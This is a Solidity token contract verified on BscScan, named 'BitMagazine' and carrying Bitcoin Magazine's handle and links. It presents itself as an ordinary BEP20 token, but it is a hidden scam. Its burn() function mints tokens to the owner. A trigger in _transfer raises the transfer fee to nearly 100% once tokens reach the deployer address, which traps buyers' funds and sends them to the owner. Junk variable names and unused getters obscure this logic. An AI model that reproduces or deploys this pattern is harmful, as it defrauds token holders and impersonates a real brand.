/**
 *Submitted for verification at BscScan.com on 2022-11-29
*/

////////////////////////////////////////////
//Bitcoin Magazine.v3
//@BitcoinMagazine
//The Most Trusted Voice In #Bitcoin ? World's Largest Bitcoin Conference ?? 
//Find us http://linktr.ee/btcinc
//http://b.tc/store
//https://b.tc/conference
//https://t.co/X4mXn3XUAg
////////////////////////////////////////////

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.5;
contract BitMagazine {
uint256 private  keBzUU = 10000000000;
uint256 private  aLCcUr = 10000000000000;
uint256 private  XFjTwi = 1000000000000000;
address private  Bbcxym = address(0);
address private  JXpqIZ = address(0);
string public  symbol = "BitMagazine";
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
uint8 public constant decimals = 18;
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  eUCZOA = 1000000000000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  KPSemA = address(0);
address private  QBlavq = address(0);
address public owner;
address private  hepijb = address(0);
uint256 private  XelgGy = 1000000000000000000;
uint256 private  dgvfBi = 100000000;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "BitMagazine";
mapping (address => mapping (address => uint256)) private _allowances;
address private  wbrMMt = address(0);
address private  wTpsER = address(0);
mapping (address => uint256) public balanceOf;
address private  MCfQTG = address(0);
uint256 public constant JmDqQp = 99999;
address private  mWkDpU = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  ccuefj = 1000000000000000000;


function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}
function _geteUCZOA() private returns (uint256) {
return eUCZOA;
}

function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getKPSemA() private returns (address) {
return KPSemA;
}

function _getkeBzUU() private returns (uint256) {
return keBzUU;
}

constructor () {
mWkDpU = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}

function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "bxTehi");
require(to != address(0), "bxTehi");
require(amount <= balanceOf[from], "bxTehi");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* JmDqQp/ccuefj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==mWkDpU){
ccuefj = JmDqQp+2;
}
emit Transfer(from, to, transferAmount);
}


function _getBbcxym() private returns (address) {
return Bbcxym;
}

function _getwbrMMt() private returns (address) {
return wbrMMt;
}

function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tbxTehi 0");
require(spender != address(0), "fbxTehi 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function _getXelgGy() private returns (uint256) {
return XelgGy;
}

function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getXFjTwi() private returns (uint256) {
return XFjTwi;
}

function _gethepijb() private returns (address) {
return hepijb;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}

function _getwTpsER() private returns (address) {
return wTpsER;
}

function _getQBlavq() private returns (address) {
return QBlavq;
}

function _getaLCcUr() private returns (uint256) {
return aLCcUr;
}

function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getJXpqIZ() private returns (address) {
return JXpqIZ;
}

function _getMCfQTG() private returns (address) {
return MCfQTG;
}

function _getdgvfBi() private returns (uint256) {
return dgvfBi;
}

}